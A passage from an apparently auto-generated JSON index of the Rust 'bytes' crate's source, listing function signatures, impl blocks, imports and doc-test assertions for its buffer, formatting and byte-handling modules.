          "fn eq(&self, other: &String) -> bool {",
          "fn partial_cmp(&self, other: &String) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &&'a T) -> bool {",
          "fn partial_cmp(&self, other: &&'a T) -> Option<cmp::Ordering> {",
          "fn default() -> Bytes {",
          "fn from(slice: &'static [u8]) -> Bytes {",
          "fn from(slice: &'static str) -> Bytes {",
          "fn from(vec: Vec<u8>) -> Bytes {",
          "fn from(slice: Box<[u8]>) -> Bytes {",
          "fn from(bytes: Bytes) -> Self {",
          "fn from(s: String) -> Bytes {",
          "fn from(bytes: Bytes) -> Vec<u8> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn static_is_unique(_: &AtomicPtr<()>) -> bool {",
          "fn drop(&mut self) {",
          "fn ptr_map<F>(ptr: *mut u8, f: F) -> *mut u8",
          "fn ptr_map<F>(ptr: *mut u8, f: F) -> *mut u8",
          "fn without_provenance(ptr: usize) -> *const u8 {",
          "fn _split_to_must_use() {}",
          "fn _split_off_must_use() {}",
          "fn bytes_cloning_vec() {"
        ],
        "struct_defs": [
          "struct OwnedLifetime {",
          "struct Owned<T> {",
          "struct Shared {"
        ],
        "impl_blocks": [
          "impl Bytes {",
          "impl Drop for Bytes {",
          "impl Clone for Bytes {",
          "impl Buf for Bytes {",
          "impl Deref for Bytes {",
          "impl AsRef<[u8]> for Bytes {",
          "impl hash::Hash for Bytes {",
          "impl Borrow<[u8]> for Bytes {",
          "impl IntoIterator for Bytes {",
          "impl FromIterator<u8> for Bytes {",
          "impl PartialEq for Bytes {",
          "impl PartialOrd for Bytes {",
          "impl Ord for Bytes {",
          "impl Eq for Bytes {}",
          "impl PartialEq<[u8]> for Bytes {",
          "impl PartialOrd<[u8]> for Bytes {",
          "impl PartialEq<Bytes> for [u8] {",
          "impl PartialOrd<Bytes> for [u8] {",
          "impl PartialEq<str> for Bytes {",
          "impl PartialOrd<str> for Bytes {",
          "impl PartialEq<Bytes> for str {",
          "impl PartialOrd<Bytes> for str {",
          "impl PartialEq<Vec<u8>> for Bytes {",
          "impl PartialOrd<Vec<u8>> for Bytes {",
          "impl PartialEq<Bytes> for Vec<u8> {",
          "impl PartialOrd<Bytes> for Vec<u8> {",
          "impl PartialEq<String> for Bytes {",
          "impl PartialOrd<String> for Bytes {",
          "impl PartialEq<Bytes> for String {",
          "impl PartialOrd<Bytes> for String {",
          "impl PartialEq<Bytes> for &[u8] {",
          "impl PartialOrd<Bytes> for &[u8] {",
          "impl PartialEq<Bytes> for &str {",
          "impl PartialOrd<Bytes> for &str {",
          "impl Default for Bytes {",
          "impl From<&'static [u8]> for Bytes {",
          "impl From<&'static str> for Bytes {",
          "impl From<Vec<u8>> for Bytes {",
          "impl From<Box<[u8]>> for Bytes {",
          "impl From<Bytes> for BytesMut {",
          "impl From<String> for Bytes {",
          "impl From<Bytes> for Vec<u8> {",
          "impl fmt::Debug for Vtable {",
          "impl Drop for Shared {"
        ],
        "uses": [
          "use core::iter::FromIterator;",
          "use core::mem::{self, ManuallyDrop};",
          "use core::ops::{Deref, RangeBounds};",
          "use core::ptr::NonNull;",
          "use core::{cmp, fmt, hash, ptr, slice, usize};",
          "use alloc::{",
          "use crate::buf::IntoIter;",
          "use crate::loom::sync::atomic::AtomicMut;",
          "use crate::loom::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};",
          "use crate::{offset_from, Buf, BytesMut};",
          "use core::ops::Bound;",
          "use loom::sync::Arc;",
          "use loom::thread;",
          "use super::Bytes;"
        ],
        "macros": [
          "/// assert_eq!(a, \"Hello\");",
          "/// assert_eq!(mem, \"world\");",
          "/// assert_eq!(b, \"Hello \");",
          "/// assert_eq!(&b[..], b\"\");",
          "/// assert_eq!(&b[..], b\"hello\");",
          "debug_assert!(!ptr.is_null());",
          "/// assert_eq!(b.len(), 5);",
          "/// assert!(b.is_empty());",
          "/// assert!(a.is_unique());",
          "/// assert!(!a.is_unique());",
          "/// assert_eq!(&b[..], b\"llo\");",
          "assert!(",
          "assert!(",
          "/// assert_eq!(&subslice[..], b\"2345\");",
          "assert!(",
          "assert!(",
          "/// assert_eq!(&a[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\" world\");",
          "assert!(",
          "/// assert_eq!(&a[..], b\" world\");",
          "/// assert_eq!(&b[..], b\"hello\");",
          "assert!(",
          "/// assert_eq!(buf, b\"hello\"[..]);",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(bytes.try_into_mut(), Ok(BytesMut::from(&b\"hello\"[..])));",
          "debug_assert!(self.len >= by, \"internal: inc_start out of bounds\");",
          "assert!(",
          "debug_assert!(",
          "/// assert_eq!(BytesMut::from(bytes), BytesMut::from(&b\"hello\"[..]));",
          "debug_assert!(",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert!(",
          "debug_assert!(actual as usize == ptr as usize);",
          "assert_eq!(b.as_ptr() as usize, addr);",
          "assert_eq!(b.as_ptr() as usize, addr);"
        ],
        "derives": [],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/loom.rs",
        "function_defs": [
          "fn with_mut<F, R>(&mut self, f: F) -> R",
          "fn with_mut<F, R>(&mut self, f: F) -> R"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/fmt/mod.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {"
        ],
        "struct_defs": [
          "struct BytesRef<'a>(&'a [u8]);"
        ],
        "impl_blocks": [
          "impl $tr for $ty {"
        ],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/fmt/debug.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Debug for BytesRef<'_> {"
        ],
        "uses": [
          "use core::fmt::{Debug, Formatter, Result};",
          "use super::BytesRef;",
          "use crate::{Bytes, BytesMut};"
        ],
        "macros": [
          "write!(f, \"b\\\"\")?;",
          "write!(f, \"\\\\n\")?;",
          "write!(f, \"\\\\r\")?;",
          "write!(f, \"\\\\t\")?;",
          "write!(f, \"\\\\{}\", b as char)?;",
          "write!(f, \"\\\\0\")?;",
          "write!(f, \"{}\", b as char)?;",
          "write!(f, \"\\\\x{:02x}\", b)?;",
          "write!(f, \"\\\"\")?;",
          "fmt_impl!(Debug, Bytes);",
          "fmt_impl!(Debug, BytesMut);"
        ],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/fmt/hex.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {",
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl LowerHex for BytesRef<'_> {",
          "impl UpperHex for BytesRef<'_> {"
        ],
        "uses": [
          "use core::fmt::{Formatter, LowerHex, Result, UpperHex};",
          "use super::BytesRef;",
          "use crate::{Bytes, BytesMut};"
        ],
        "macros": [
          "write!(f, \"{:02x}\", b)?;",
          "write!(f, \"{:02X}\", b)?;",
          "fmt_impl!(LowerHex, Bytes);",
          "fmt_impl!(LowerHex, BytesMut);",
          "fmt_impl!(UpperHex, Bytes);",
          "fmt_impl!(UpperHex, BytesMut);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/limit.rs",
        "function_defs": [
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::buf::UninitSlice;",
          "use crate::BufMut;",
          "use core::cmp;"
        ],
        "macros": [
          "assert!(cnt <= self.limit);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/chain.rs",
        "function_defs": [
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, mut cnt: usize) {",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [IoSlice<'a>]) -> usize {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn into_iter(self) -> Self::IntoIter {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::buf::{IntoIter, UninitSlice};",
          "use crate::{Buf, BufMut};",
          "use std::io::IoSlice;"
        ],
        "macros": [
          "/// assert_eq!(full[..], b\"hello world\"[..]);",
          "/// assert_eq!(buf.first_ref()[..], b\"hello\"[..]);",
          "/// assert_eq!(full, b\"elloworld\"[..]);",
          "/// assert_eq!(buf.last_ref()[..], b\"world\"[..]);",
          "/// assert_eq!(full, b\"hello orld\"[..]);",
          "/// assert_eq!(first[..], b\"hello\"[..]);",
          "/// assert_eq!(last[..], b\"world\"[..]);",
          "assert!("
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/iter.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<u8> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::Buf;"
        ],
        "macros": [
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(iter.next(), Some(b'b'));",
          "/// assert_eq!(iter.next(), Some(b'c'));",
          "/// assert_eq!(iter.next(), None);",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(iter.next(), Some(b'b'));",
          "/// assert_eq!(iter.next(), Some(b'c'));",
          "/// assert_eq!(iter.next(), None);",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(2, buf.remaining());",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(2, iter.get_ref().remaining());",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(iter.next(), Some(b'c'));"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/buf_impl.rs",
        "function_defs": [
          "fn sign_extend(val: u64, nbytes: usize) -> i64 {",
          "fn remaining(&self) -> usize;",
          "fn chunk(&self) -> &[u8];",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [IoSlice<'a>]) -> usize {",
          "fn advance(&mut self, cnt: usize);",
          "fn has_remaining(&self) -> bool {",
          "fn copy_to_slice(&mut self, dst: &mut [u8]) {",
          "fn get_u8(&mut self) -> u8 {",
          "fn get_i8(&mut self) -> i8 {",
          "fn get_u16(&mut self) -> u16 {",
          "fn get_u16_le(&mut self) -> u16 {",
          "fn get_u16_ne(&mut self) -> u16 {",
          "fn get_i16(&mut self) -> i16 {",
          "fn get_i16_le(&mut self) -> i16 {",
          "fn get_i16_ne(&mut self) -> i16 {",
          "fn get_u32(&mut self) -> u32 {",
          "fn get_u32_le(&mut self) -> u32 {",
          "fn get_u32_ne(&mut self) -> u32 {",
          "fn get_i32(&mut self) -> i32 {",
          "fn get_i32_le(&mut self) -> i32 {",
          "fn get_i32_ne(&mut self) -> i32 {",
          "fn get_u64(&mut self) -> u64 {",
          "fn get_u64_le(&mut self) -> u64 {",
          "fn get_u64_ne(&mut self) -> u64 {",
          "fn get_i64(&mut self) -> i64 {",
          "fn get_i64_le(&mut self) -> i64 {",
          "fn get_i64_ne(&mut self) -> i64 {",
          "fn get_u128(&mut self) -> u128 {",
          "fn get_u128_le(&mut self) -> u128 {",
          "fn get_u128_ne(&mut self) -> u128 {",
          "fn get_i128(&mut self) -> i128 {",
          "fn get_i128_le(&mut self) -> i128 {",
          "fn get_i128_ne(&mut self) -> i128 {",
          "fn get_uint(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_le(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_ne(&mut self, nbytes: usize) -> u64 {",
          "fn get_int(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_le(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_ne(&mut self, nbytes: usize) -> i64 {",
          "fn get_f32(&mut self) -> f32 {",
          "fn get_f32_le(&mut self) -> f32 {",
          "fn get_f32_ne(&mut self) -> f32 {",
          "fn get_f64(&mut self) -> f64 {",
          "fn get_f64_le(&mut self) -> f64 {",
          "fn get_f64_ne(&mut self) -> f64 {",
          "fn try_copy_to_slice(&mut self, mut dst: &mut [u8]) -> Result<(), TryGetError> {",
          "fn try_get_u8(&mut self) -> Result<u8, TryGetError> {",
          "fn try_get_i8(&mut self) -> Result<i8, TryGetError> {",
          "fn try_get_u16(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_le(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_ne(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_i16(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_le(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_ne(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_u32(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_le(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_ne(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_i32(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_le(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_ne(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_u64(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_le(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_ne(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_i64(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_le(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_ne(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_u128(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_le(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_ne(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_i128(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_le(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_ne(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_uint(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_le(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_ne(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_int(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_le(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_ne(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_f32(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_le(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_ne(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f64(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_le(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_ne(&mut self) -> Result<f64, TryGetError> {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn take(self, limit: usize) -> Take<Self>",
          "fn chain<U: Buf>(self, next: U) -> Chain<Self, U>",
          "fn reader(self) -> Reader<Self>",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn chunks_vectored<'b>(&'b self, dst: &mut [IoSlice<'b>]) -> usize {",
          "fn advance(&mut self, cnt: usize) {",
          "fn has_remaining(&self) -> bool {",
          "fn copy_to_slice(&mut self, dst: &mut [u8]) {",
          "fn get_u8(&mut self) -> u8 {",
          "fn get_i8(&mut self) -> i8 {",
          "fn get_u16(&mut self) -> u16 {",
          "fn get_u16_le(&mut self) -> u16 {",
          "fn get_u16_ne(&mut self) -> u16 {",
          "fn get_i16(&mut self) -> i16 {",
          "fn get_i16_le(&mut self) -> i16 {",
          "fn get_i16_ne(&mut self) -> i16 {",
          "fn get_u32(&mut self) -> u32 {",
          "fn get_u32_le(&mut self) -> u32 {",
          "fn get_u32_ne(&mut self) -> u32 {",
          "fn get_i32(&mut self) -> i32 {",
          "fn get_i32_le(&mut self) -> i32 {",
          "fn get_i32_ne(&mut self) -> i32 {",
          "fn get_u64(&mut self) -> u64 {",
          "fn get_u64_le(&mut self) -> u64 {",
          "fn get_u64_ne(&mut self) -> u64 {",
          "fn get_i64(&mut self) -> i64 {",
          "fn get_i64_le(&mut self) -> i64 {",
          "fn get_i64_ne(&mut self) -> i64 {",
          "fn get_u128(&mut self) -> u128 {",
          "fn get_u128_le(&mut self) -> u128 {",
          "fn get_u128_ne(&mut self) -> u128 {",
          "fn get_i128(&mut self) -> i128 {",
          "fn get_i128_le(&mut self) -> i128 {",
          "fn get_i128_ne(&mut self) -> i128 {",
          "fn get_uint(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_le(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_ne(&mut self, nbytes: usize) -> u64 {",
          "fn get_int(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_le(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_ne(&mut self, nbytes: usize) -> i64 {",
          "fn get_f32(&mut self) -> f32 {",
          "fn get_f32_le(&mut self) -> f32 {",
          "fn get_f32_ne(&mut self) -> f32 {",
          "fn get_f64(&mut self) -> f64 {",
          "fn get_f64_le(&mut self) -> f64 {",
          "fn get_f64_ne(&mut self) -> f64 {",
          "fn try_copy_to_slice(&mut self, dst: &mut [u8]) -> Result<(), TryGetError> {",
          "fn try_get_u8(&mut self) -> Result<u8, TryGetError> {",
          "fn try_get_i8(&mut self) -> Result<i8, TryGetError> {",
          "fn try_get_u16(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_le(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_ne(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_i16(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_le(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_ne(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_u32(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_le(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_ne(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_i32(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_le(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_ne(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_u64(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_le(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_ne(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_i64(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_le(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_ne(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_u128(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_le(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_ne(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_i128(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_le(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_ne(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_uint(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_le(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_ne(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_int(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_le(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_ne(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_f32(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_le(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_ne(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f64(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_le(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_ne(&mut self) -> Result<f64, TryGetError> {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_slice(&mut self, dst: &mut [u8]) {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn _assert_trait_object(_b: &dyn Buf) {}"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Buf for &[u8] {"
        ],
        "uses": [
          "use crate::buf::{reader, Reader};",
          "use crate::buf::{take, Chain, Take};",
          "use crate::{min_u64_usize, saturating_sub_usize_u64};",
          "use crate::{panic_advance, panic_does_not_fit, TryGetError};",
          "use std::io::IoSlice;",
          "use alloc::boxed::Box;",
          "use super::BufMut;"
        ],
        "macros": [
          "return (|| buf_try_get_impl!($this, $typ::$conv))()",
          "return (|| buf_try_get_impl!(le => $this, $typ, $len_to_read))()",
          "return (|| buf_try_get_impl!(be => $this, $typ, $len_to_read))()",
          "/// assert_eq!(b'h', buf.get_u8());",
          "/// assert_eq!(b'e', buf.get_u8());",
          "/// assert_eq!(b'l', buf.get_u8());",
          "/// assert_eq!(&rest[..], &b\"lo world\"[..]);",
          "/// assert_eq!(buf.remaining(), 11);",
          "/// assert_eq!(buf.remaining(), 10);",
          "/// assert_eq!(buf.chunk(), &b\"hello world\"[..]);",
          "/// assert_eq!(buf.chunk(), &b\"world\"[..]);",
          "/// assert_eq!(buf.chunk(), &b\"hello world\"[..]);",
          "/// assert_eq!(buf.chunk(), &b\"world\"[..]);",
          "/// assert!(buf.has_remaining());",
          "/// assert!(!buf.has_remaining());",
          "/// assert_eq!(&b\"hello\"[..], &dst);",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(8, buf.get_u8());",
          "/// assert_eq!(8, buf.get_i8());",
          "/// assert_eq!(0x0809, buf.get_u16());",
          "buf_get_impl!(self, u16::from_be_bytes);",
          "/// assert_eq!(0x0809, buf.get_u16_le());",
          "buf_get_impl!(self, u16::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809, buf.get_u16_ne());",
          "buf_get_impl!(self, u16::from_ne_bytes);",
          "/// assert_eq!(0x0809, buf.get_i16());",
          "buf_get_impl!(self, i16::from_be_bytes);",
          "/// assert_eq!(0x0809, buf.get_i16_le());",
          "buf_get_impl!(self, i16::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809, buf.get_i16_ne());",
          "buf_get_impl!(self, i16::from_ne_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_u32());",
          "buf_get_impl!(self, u32::from_be_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_u32_le());",
          "buf_get_impl!(self, u32::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809A0A1, buf.get_u32_ne());",
          "buf_get_impl!(self, u32::from_ne_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_i32());",
          "buf_get_impl!(self, i32::from_be_bytes);",
          "/// assert_eq!(0x0809A0A1, buf.get_i32_le());",
          "buf_get_impl!(self, i32::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0809A0A1, buf.get_i32_ne());",
          "buf_get_impl!(self, i32::from_ne_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_u64());",
          "buf_get_impl!(self, u64::from_be_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_u64_le());",
          "buf_get_impl!(self, u64::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0102030405060708, buf.get_u64_ne());",
          "buf_get_impl!(self, u64::from_ne_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_i64());",
          "buf_get_impl!(self, i64::from_be_bytes);",
          "/// assert_eq!(0x0102030405060708, buf.get_i64_le());",
          "buf_get_impl!(self, i64::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x0102030405060708, buf.get_i64_ne());",
          "buf_get_impl!(self, i64::from_ne_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_u128());",
          "buf_get_impl!(self, u128::from_be_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_u128_le());",
          "buf_get_impl!(self, u128::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_u128_ne());",
          "buf_get_impl!(self, u128::from_ne_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_i128());",
          "buf_get_impl!(self, i128::from_be_bytes);",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_i128_le());",
          "buf_get_impl!(self, i128::from_le_bytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x01020304050607080910111213141516, buf.get_i128_ne());",
          "buf_get_impl!(self, i128::from_ne_bytes);",
          "/// assert_eq!(0x010203, buf.get_uint(3));",
          "buf_get_impl!(be => self, u64, nbytes);",
          "/// assert_eq!(0x010203, buf.get_uint_le(3));",
          "buf_get_impl!(le => self, u64, nbytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x010203, buf.get_uint_ne(3));",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x010203, buf.get_int(3));",
          "/// assert_eq!(0x010203, buf.get_int_le(3));",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(0x010203, buf.get_int_ne(3));",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32());",
          "/// assert_eq!(1.2f32, buf.get_f32_le());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32_ne());",
          "/// assert_eq!(1.2f64, buf.get_f64());",
          "/// assert_eq!(1.2f64, buf.get_f64_le());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f64, buf.get_f64_ne());",
          "/// assert_eq!(Ok(()), buf.try_copy_to_slice(&mut dst));",
          "/// assert_eq!(&b\"hello\"[..], &dst);",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 12, available: 11}), buf.try_copy_to_s",
          "/// assert_eq!(11, buf.remaining());",
          "/// assert_eq!(Ok(0x08_u8), buf.try_get_u8());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 1, available: 0}), buf.try_get_u8());",
          "/// assert_eq!(Ok(0x08_i8), buf.try_get_i8());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 1, available: 0}), buf.try_get_i8());",
          "/// assert_eq!(Ok(0x0809_u16), buf.try_get_u16());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_u16());",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, u16::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809_u16), buf.try_get_u16_le());",
          "/// assert_eq!(6, buf.remaining());",
